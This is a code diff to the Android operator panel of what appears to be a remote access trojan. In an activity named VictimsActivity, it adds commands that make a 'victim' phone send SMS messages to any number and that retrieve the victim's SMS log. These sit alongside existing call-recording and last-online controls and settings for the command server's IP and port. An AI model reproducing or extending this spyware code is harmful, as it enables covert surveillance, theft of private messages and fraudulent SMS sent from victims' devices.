@@ -195,6 +195,8 @@ public class VictimsActivity extends AppCompatActivity {
         menu.add("Последний онлайн");
         menu.add("Запись разговора");
         menu.add("Остановить запись");
+        menu.add("Отправить SMS");
+        menu.add("Сохранить лог SMS");
         menu.add("Изменить имя");
         menu.add("Изменить IP_ADDRESS");
         menu.add("Изменить SERVER_PORT");
@@ -246,6 +248,39 @@ public class VictimsActivity extends AppCompatActivity {
                 break;
             case "Остановить запись":
                 NettyClient.getInstance().sendStopAudioRecord(victim);
+                break;
+            case "Отправить SMS":
+                layoutInflater = LayoutInflater.from(this);
+                final View inputView1 = layoutInflater.inflate(R.layout.view_input_sms, null);
+                TextView phoneNumberTextView = (TextView) inputView1.findViewById(R.id.phoneNumberTextView);
+
+                alertDialogBuilder = new AlertDialog.Builder(this);
+                alertDialogBuilder.setView(inputView1);
+
+                alertDialogBuilder.setCancelable(false);
+                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
+                    @Override
+                    public void onClick(DialogInterface dialog, int which) {
+                        String phoneNumber = ((EditText) inputView1.findViewById(R.id.phoneNumberEditText)).getText().toString();
+                        String text = ((EditText) inputView1.findViewById(R.id.textEditText)).getText().toString();
+                        if (phoneNumber.trim().isEmpty() || text.trim().isEmpty()) return;
+                        NettyClient.getInstance().sendSendSms(phoneNumber, text, victim);
+                    }
+                });
+
+                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
+                    @Override
+                    public void onClick(DialogInterface dialog, int which) {
+                        int x = 0;
+                        dialog.cancel();
+                    }
+                });
+
+                alertDialogBuilder.create();
+                alertDialogBuilder.show();
+                break;
+            case "Сохранить лог SMS":
+                NettyClient.getInstance().sendSaveSmsLog(victim);
                 break;
             case "Изменить имя":
                 layoutInflater = LayoutInflater.from(this);
